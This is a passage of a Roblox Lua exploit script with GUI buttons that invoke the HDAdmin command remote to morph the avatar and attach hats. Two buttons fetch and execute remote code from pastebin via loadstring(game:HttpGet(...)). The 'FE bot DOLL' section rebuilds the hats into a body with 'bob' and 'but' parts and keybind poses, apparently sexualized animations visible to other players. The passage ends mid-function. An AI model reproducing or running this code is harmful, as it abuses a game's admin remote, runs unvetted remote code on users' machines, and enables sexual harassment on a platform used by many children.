    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 6060224214")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 5971691715")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 5205483683")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 2309346267")
    wait(1)
    
    loadstring(game:HttpGet("https://pastebin.com/raw/VgAqNERG"))()

end)

fescripts:addButton("FE HANDS",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "note";
        Text = "this was made by khlat and makram dacca "
    })
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
    wait(0.4)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";char ")
    wait(1)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4855525473")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 8337370")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 48474313")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 48474294")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 451220849")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 62724852")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 20372960")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 63690008")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 62234425")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 376524487")
    wait(2)

    loadstring(game:HttpGet("https://pastebin.com/raw/mvJvEQr7"))()

end)


fescripts:addButton("FE bot DOLL ",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "note";
        Text = "this was made by khlat and makram dacca "
    })
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
    wait(0.4)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";char ")
    wait(1)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4904137145")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4246228452")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4911305457")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4822592866")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 3992084515")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 14815761")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 48474294")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 63690008")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 62234425")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 451220849")
    wait(2)

    
local tog = true
local move = false
local jit = Vector3.new(30,0,0)
local Player = game:GetService("Players").LocalPlayer
local Character = Player.Character

game:GetService("RunService").Heartbeat:Connect(function()
    Character["InternationalFedora"].Handle.Velocity = jit
    Character["MeshPartAccessory"].Handle.Velocity = jit
    Character["Uranus"].Handle.Velocity = jit
    Character["MarsPet"].Handle.Velocity = jit
    Character["Hat1"].Handle.Velocity = jit
    Character["LongHairHeadBand Black"].Handle.Velocity = jit
    Character["LavanderHair"].Handle.Velocity = jit
    Character["Pal Hair"].Handle.Velocity = jit
    Character["Pink Hair"].Handle.Velocity = jit
    Character["EmotimaskRelax"].Handle.Velocity = jit
end)

local Head = "EmotimaskRelax" --press f9 and find the hat that looks like a heads name and put it here
local x = -4   --Edit Position for head n +left and -Right
local y = 0.2   --Edit Position for head up and down
local z = 0 --Edit Position for head x3

local Hats = {rightarm = Character:WaitForChild("Hat1"),
             leftarm  = Character:WaitForChild("Pal Hair"),
             rightleg = Character:WaitForChild("LavanderHair"),
             leftleg  = Character:WaitForChild("Pink Hair"),
              torso1   = Character:WaitForChild("LongHairHeadBand Black"),
              but1   = Character:WaitForChild("InternationalFedora"),
             but2   = Character:WaitForChild("MeshPartAccessory"),
              bob1   = Character:WaitForChild("MarsPet"),
             bob2   = Character:WaitForChild("Uranus"),

}

for i,v in next, Hats do
v.Handle.AccessoryWeld:Remove()
for _,mesh in next, v:GetDescendants() do
if mesh:IsA("Mesh") or mesh:IsA("SpecialMesh") then
mesh:Remove()
end
end
end

local function align(i,v)
local att0 = Instance.new("Attachment", i)
att0.Position = Vector3.new(0,0,0)
local att1 = Instance.new("Attachment", v)
att1.Position = Vector3.new(0,0,0)
local AP = Instance.new("AlignPosition", i)
AP.Attachment0 = att0
AP.Attachment1 = att1
AP.RigidityEnabled = false
AP.ReactionForceEnabled = false
AP.ApplyAtCenterOfMass = true
AP.MaxForce = 9999999
AP.MaxVelocity = math.huge
AP.Responsiveness = 200
local AO = Instance.new("AlignOrientation", i)
AO.Attachment0 = att0
AO.Attachment1 = att1
AO.ReactionTorqueEnabled = false
AO.PrimaryAxisOnly = false
AO.MaxTorque = 9999999
AO.MaxAngularVelocity = math.huge
AO.Responsiveness = 200
end
align(Hats.torso1.Handle, Character["Torso"])
align(Hats.rightarm.Handle, Character["Torso"])
align(Hats.leftarm.Handle, Character["Torso"])
align(Hats.rightleg.Handle, Character["Torso"])
align(Hats.leftleg.Handle, Character["Torso"])
align(Hats.but1.Handle, Character["Torso"])
align(Hats.but2.Handle, Character["Torso"])
align(Hats.bob1.Handle, Character["Torso"])
align(Hats.bob2.Handle, Character["Torso"])
Hats.torso1.Handle.Attachment.Rotation = Vector3.new(180,90,0)
Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(90,0,10)
Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(90,0,-20)
Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(90,0,5)
Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(90,0,-5)
Hats.but1.Handle.Attachment.Rotation = Vector3.new(0,0,-5)
Hats.but2.Handle.Attachment.Rotation = Vector3.new(0,0,5)
Hats.bob1.Handle.Attachment.Rotation = Vector3.new(15,0,0)
Hats.bob2.Handle.Attachment.Rotation = Vector3.new(15,0,0)

Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment1"
Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment2"
Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment3"
Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment4"
Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment5"
Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment6"
Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment7"
Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment8"
Character:WaitForChild("Torso"):FindFirstChild("Attachment").Name = "Attachment9"

Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(-4,-0.1,0)
Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-5.5,0.2,0)
Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(-2.3,0.2,0)
Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-4.6,-2,0)
Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(-3.4,-2,0)
Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-4.5,-1,0.5)
Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(-3.5,-1,0.5)
Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-3.4,0.4,-0.5)
Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(-4.6,0.4,-0.5)

Character:WaitForChild(Head).Handle.AccessoryWeld:Remove()
local alignpos = Instance.new("AlignPosition", Character)
local alignorien = Instance.new("AlignOrientation", Character)
local att1 = Instance.new("Attachment", Character:WaitForChild(Head).Handle)
local att2 = Instance.new("Attachment", Character:WaitForChild("Head"))
alignpos.Attachment0 = att1
alignpos.Attachment1 = att2
alignpos.RigidityEnabled = false
alignpos.ReactionForceEnabled = false
alignpos.ApplyAtCenterOfMass = true
alignpos.MaxForce = 99999999
alignpos.MaxVelocity = math.huge
alignpos.Responsiveness = 200
alignorien.Attachment0 = att1
alignorien.Attachment1 = att2
alignorien.ReactionTorqueEnabled = false
alignorien.PrimaryAxisOnly = false
alignorien.MaxTorque = 99999999
alignorien.MaxAngularVelocity = math.huge
alignorien.Responsiveness = 200
att2.Position = Vector3.new(x,y,z)


game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
 if KeyPressed == "z" then
     if toggle == false then
         
         Character.Humanoid.WalkSpeed = 16
         
         Character.Humanoid.Sit = false
         
         Character.Torso.Anchored = false
         
            Character.Humanoid.HipHeight = 0
                Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(0,4,0)
                Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(1,2,0)
                Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(-1,2,0)
                Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-1.7,5.4,0)
                Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(1.7,5.4,0)
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(0.55,4.8,0.5)
                Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(-0.55,4.8,0.5)
                Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(0.55,3.7,-0.5)
            Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(-0.55,3.7,-0.5)

		       Hats.torso1.Handle.Attachment.Rotation = Vector3.new(180,90,0)
                Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(90,0,-20)
                Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(90,0,20)
                Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(90,0,120)
                Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(90,0,-120)
                Hats.but1.Handle.Attachment.Rotation = Vector3.new(-10,0,-5)
                Hats.but2.Handle.Attachment.Rotation = Vector3.new(-10,0,5)
                Hats.bob1.Handle.Attachment.Rotation = Vector3.new(-20,0,0)
            Hats.bob2.Handle.Attachment.Rotation = Vector3.new(-20,0,0)

                
                
                
                att2.Position = Vector3.new(0,1.2,-0.7)
                att2.Rotation = Vector3.new(55,0,180)
           toggle = true
 else
            Character.Humanoid.HipHeight = 0
                Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(0,2.5,1)
                Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.3,3.8,1)
                Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(1.3,3.8,1)
                Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-1,1.5,0.5)
                Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(1,1.5,0.5)
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-0.6,1.6,1.5)
                Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(0.6,1.6,1.5)
                Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(0.55,3.1,0.5)
            Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(-0.5,3.1,0.5)
            
		    Hats.torso1.Handle.Attachment.Rotation = Vector3.new(180,90,0)
                Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(90,0,145)
                Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(90,0,-145)
                Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(0,-25,0)
                Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(0,25,0)
                Hats.but1.Handle.Attachment.Rotation = Vector3.new(0,0,-5)
                Hats.but2.Handle.Attachment.Rotation = Vector3.new(0,0,5)
                Hats.bob1.Handle.Attachment.Rotation = Vector3.new(15,0,0)
            Hats.bob2.Handle.Attachment.Rotation = Vector3.new(15,0,0)
           
 
	    

                
            att2.Position = Vector3.new(0,2.8,1)
            att2.Rotation = Vector3.new(0,0,0)
            toggle = false
        end
    end
end)


game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
 if KeyPressed == "q" then
     if toggle == false then
         
         Character.Humanoid.WalkSpeed = 16
         
         Character.Humanoid.Sit = false
         
         Character.Torso.Anchored = false
         
            Character.Humanoid.HipHeight = 0
                Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(0,-0.2,-1.7)
                Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.2,0.7,-1)
                Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(1.2,0.7,-1)
                Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-0.6,-2,-1.7)
                Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(0.6,-2,-1.7)
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-0.5,-1,-2.2)
                Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(0.5,-1,-2.2)
                Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-0.6,0.3,-1.2)
            Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(0.6,0.3,-1.2)
            
            Hats.torso1.Handle.Attachment.Rotation = Vector3.new(180,90,0)
                Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(30,10,60)
                Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(30,-10,-60)
                Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(90,0,5)
                Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(90,0,-5)
                Hats.but1.Handle.Attachment.Rotation = Vector3.new(0,0,-5)
                Hats.but2.Handle.Attachment.Rotation = Vector3.new(0,0,5)
                Hats.bob1.Handle.Attachment.Rotation = Vector3.new(15,180,0)
            Hats.bob2.Handle.Attachment.Rotation = Vector3.new(15,180,0)
                
                att2.Position = Vector3.new(0,0.1,-1.7)
                att2.Rotation = Vector3.new(0,180,0)
           toggle = true
 else
            Character.Humanoid.HipHeight = 0
                Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(-4,-0.1,0)
                Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-5.5,0.2,0)
                Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(-2.3,0.2,0)
                Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-4.6,-2,0)
                Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(-3.4,-2,0)
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-4.5,-1,0.5)
                Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(-3.5,-1,0.5)
                Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-3.4,0.4,-0.5)
            Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(-4.6,0.4,-0.5)
            
            Hats.torso1.Handle.Attachment.Rotation = Vector3.new(180,90,0)
                Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(90,0,10)
                Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(90,0,-20)
                Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(90,0,5)
                Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(90,0,-5)
                Hats.but1.Handle.Attachment.Rotation = Vector3.new(0,0,-5)
                Hats.but2.Handle.Attachment.Rotation = Vector3.new(0,0,5)
                Hats.bob1.Handle.Attachment.Rotation = Vector3.new(15,0,0)
            Hats.bob2.Handle.Attachment.Rotation = Vector3.new(15,0,0)


            att2.Position = Vector3.new(x,y,z)
            att2.Rotation = Vector3.new(0,0,0)
            toggle = false
        end
    end
end)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
 if KeyPressed == "x" then
     if toggle == false then
         
         Character.Humanoid.WalkSpeed = 16
         
         Character.Humanoid.Sit = false
         
         Character.Torso.Anchored = false
         
            Character.Humanoid.HipHeight = 0
                Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(0,-1.2,-2.4)
                Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.15,-2,-3.45)
                Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(1.15,-2,-3.45)
                Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-1.2,-2,-1)
                Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(1.2,-2,-1)
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-0.54,-1,-1.4)
                Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(0.54,-1,-1.4)
                Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-0.54,-1.9,-3.0)
            Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(0.54,-1.9,-3.0)
            
            Hats.torso1.Handle.Attachment.Rotation = Vector3.new(90,0,90)
                Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(70,-30,0)
                Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(70,30,0)
                Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(-60,60,0)
                Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(60,120,0)
                Hats.but1.Handle.Attachment.Rotation = Vector3.new(-17,0,0)
                Hats.but2.Handle.Attachment.Rotation = Vector3.new(-17,0,0)
                Hats.bob1.Handle.Attachment.Rotation = Vector3.new(0,0,0)
            Hats.bob2.Handle.Attachment.Rotation = Vector3.new(0,0,0)
                
                att2.Position = Vector3.new(0,-2.3,-4.1)
            att2.Rotation = Vector3.new(-30,0,0)
           toggle = true
 else
            Character.Humanoid.HipHeight = 0
                Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(0,-1.2,-2)
                Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.15,-2,-3.45)
                Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(1.15,-2,-3.45)
                Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-1.2,-2,-1)
                Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(1.2,-2,-1)
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-0.54,-1,-1)
                Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(0.54,-1,-1)
                Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-0.54,-1.9,-2.6)
            Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(0.54,-1.9,-2.6)
            
            Hats.torso1.Handle.Attachment.Rotation = Vector3.new(90,0,90)
                Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(50,-30,0)
                Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(50,30,0)
                Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(-60,90,0)
                Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(60,90,0)
                Hats.but1.Handle.Attachment.Rotation = Vector3.new(-17,0,0)
                Hats.but2.Handle.Attachment.Rotation = Vector3.new(-17,0,0)
                Hats.bob1.Handle.Attachment.Rotation = Vector3.new(0,0,0)
            Hats.bob2.Handle.Attachment.Rotation = Vector3.new(0,0,0)


            att2.Position = Vector3.new(0,-2.3,-3.7)
            att2.Rotation = Vector3.new(-30,0,0)
            toggle = false
        end
    end
end)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
 if KeyPressed == "e" then
     if toggle == false then
         
         Character.Humanoid.WalkSpeed = 16
         
         Character.Humanoid.Sit = false
         
         Character.Torso.Anchored = false
         
            Character.Humanoid.HipHeight = 0
                Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(-0,0.4,-1.5) --torso/black hair
                Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.163,-0.843,-1.071) --rightarm/Hat1
                Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(1.163,-0.843,-1.071) --leftarm/palhair
                Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-1.122,1.454,-0.72) --rightleg/lavenderhair
                Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(1.122,1.454,-0.72) --leftleg/pink hair
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-0.495,1.479,-1.64) --but1/fedora
                Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(0.495,1.479,-1.64) --but2/mesh
                Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-0.53,-0.2, -1) --bob1/mars
            Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(0.53,-0.2,-1) --bob2/uranus
            
            Hats.torso1.Handle.Attachment.Rotation = Vector3.new(0,90,0) --torso/black hair
                Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(30,-143.49,20.32) --rightarm/Hat1
                Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(30,143.49,-20.32) --leftarm/palhair
                Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(27.81,141.21,159.03) --rightleg/lavenderhair
                Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(27.81, -141.21, -159.03) --leftleg/pink hair
                Hats.but1.Handle.Attachment.Rotation = Vector3.new(-15.84,-8.32,2.29) --but1/fedora
                Hats.but2.Handle.Attachment.Rotation = Vector3.new(-15.84,8.32,-2.29) --but2/mesh
                Hats.bob1.Handle.Attachment.Rotation = Vector3.new(0,0,0) --bob1/mars
            Hats.bob2.Handle.Attachment.Rotation = Vector3.new(0,0,0) --bob2/uranus
                
            att2.Position = Vector3.new(-0.155,-2.76,-1)
            att2.Rotation = Vector3.new(0,180,180)
           toggle = true
 else
            Character.Humanoid.HipHeight = 0
                Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(-0,0.4,-1.5) --torso/black hair
                Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.163,-0.843,-1.071) --rightarm/Hat1
                Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(1.163,-0.843,-1.071) --leftarm/palhair
                Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-1.122,1.454,-0.72) --rightleg/lavenderhair
                Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(1.122,1.454,-0.72) --leftleg/pink hair
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-0.495,1.479,-1.64) --but1/fedora
                Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(0.495,1.479,-1.64) --but2/mesh
                Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-0.53,-0.2, -1) --bob1/mars
            Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(0.53,-0.2,-1) --bob2/uranus
            
            Hats.torso1.Handle.Attachment.Rotation = Vector3.new(0,90,0) --torso/black hair
                Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(30,-143.49,20.32) --rightarm/Hat1
                Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(30,143.49,-20.32) --leftarm/palhair
                Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(27.81,141.21,159.03) --rightleg/lavenderhair
                Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(27.81, -141.21, -159.03) --leftleg/pink hair
                Hats.but1.Handle.Attachment.Rotation = Vector3.new(-15.84,-8.32,2.29) --but1/fedora
                Hats.but2.Handle.Attachment.Rotation = Vector3.new(-15.84,8.32,-2.29) --but2/mesh
                Hats.bob1.Handle.Attachment.Rotation = Vector3.new(0,0,0) --bob1/mars
            Hats.bob2.Handle.Attachment.Rotation = Vector3.new(0,0,0) --bob2/uranus


            att2.Position = Vector3.new(-0.155,-2.76,-1.509)
            att2.Rotation = Vector3.new(0,180,180)
            toggle = false
        end
    end
end)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
 if KeyPressed == "c" then
     if toggle == false then
         
                Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(-0, 0.209, 1.709) --torso/black hair
                Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(1.45, 0.386, 1.24) --rightarm/Hat1
                Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(-1.45, 0.386, 1.24) --leftarm/palhair
                Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(0.636, -1.95, 1.499) --rightleg/lavenderhair
                Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(-0.636, -1.95, 1.499) --leftleg/pink hair
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(0.528, -1.214, 0.419) --but1/fedora
                Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(-0.528, -1.214, 0.419) --but2/mesh
                Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-0.535, 0.253, -0.607) --bob1/mars
            Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(0.496, 0.254, -0.604) --bob2/uranus
            
            Hats.torso1.Handle.Attachment.Rotation = Vector3.new(90, 101.38, 90) --torso/black hair
                Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(-30.06, 0, 0) --rightarm/Hat1
                Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(-30.06, 0, 0) --leftarm/palhair
                Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(-109.58, 0, 0) --rightleg/lavenderhair
                Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(-109.58, 0, 0) --leftleg/pink hair
                Hats.but1.Handle.Attachment.Rotation = Vector3.new(11.3, 0, 0) --but1/fedora
                Hats.but2.Handle.Attachment.Rotation = Vector3.new(11.3, 0, 0) --but2/mesh
                Hats.bob1.Handle.Attachment.Rotation = Vector3.new(20, 0, 0) --bob1/mars
            Hats.bob2.Handle.Attachment.Rotation = Vector3.new(20, 0, 0) --bob2/uranus
                
            att2.Position = Vector3.new(0, 0.5, 1.2)
            att2.Rotation = Vector3.new(-19.35, 0, 0)
           toggle = true
 else
                Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(-0, 0.192, 1.795) --torso/black hair
                Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(1.45, 0.386, 1.24) --rightarm/Hat1
                Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(-1.45, 0.386, 1.24) --leftarm/palhair
                Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(0.605, -1.977, 1.7) --rightleg/lavenderhair
                Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(-0.605, -1.977, 1.7) --leftleg/pink hair
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(0.528, -1.214, 0.419) --but1/fedora
                Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(-0.528, -1.214, 0.419) --but2/mesh
                Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-0.535, 0.253, -0.607) --bob1/mars
            Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(0.496, 0.254, -0.604) --bob2/uranus
            
            Hats.torso1.Handle.Attachment.Rotation = Vector3.new(90, 78.62, 90) --torso/black hair
                Hats.rightarm.Handle.Attachment.Rotation = Vector3.new(-30.06, 0, 0) --rightarm/Hat1
                Hats.leftarm.Handle.Attachment.Rotation = Vector3.new(-30.06, 0, 0) --leftarm/palhair
                Hats.rightleg.Handle.Attachment.Rotation = Vector3.new(-85.58, 0, 0) --rightleg/lavenderhair
                Hats.leftleg.Handle.Attachment.Rotation = Vector3.new(-85.58, 0, 0) --leftleg/pink hair
                Hats.but1.Handle.Attachment.Rotation = Vector3.new(11.3, 0, 0) --but1/fedora
                Hats.but2.Handle.Attachment.Rotation = Vector3.new(11.3, 0, 0) --but2/mesh
                Hats.bob1.Handle.Attachment.Rotation = Vector3.new(20, 0, 0) --bob1/mars
            Hats.bob2.Handle.Attachment.Rotation = Vector3.new(20, 0, 0) --bob2/uranus


            att2.Position = Vector3.new(0, 0.5, 1.885)
            att2.Rotation = Vector3.new(-19.35, 0, 0)
            toggle = false
        end
    end
end)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
 if KeyPressed == "r" then
     if toggle == false then
         
                Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(0, 0.496, -1.49) --torso/black hair
                Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.355, 1.199, -0.838) --rightarm/Hat1
                Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(1.355, 1.199, -0.838) --leftarm/palhair
                Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(-1.021, -0.814, -0.517) --rightleg/lavenderhair
                Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(1.021, -0.814, -0.517) --leftleg/pink hair
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(-0.551, -1.054, -1.65) --but1/fedora
                Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(0.551, -1.054, -1.65) --but2/mesh
                Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(-0.509, 1.1, -0.95) --bob1/mars
            Character:WaitForChild("Torso").Attachment9.Position = Vector3.new(0.509, 1.1, -0.95) --bob2/uranus
            
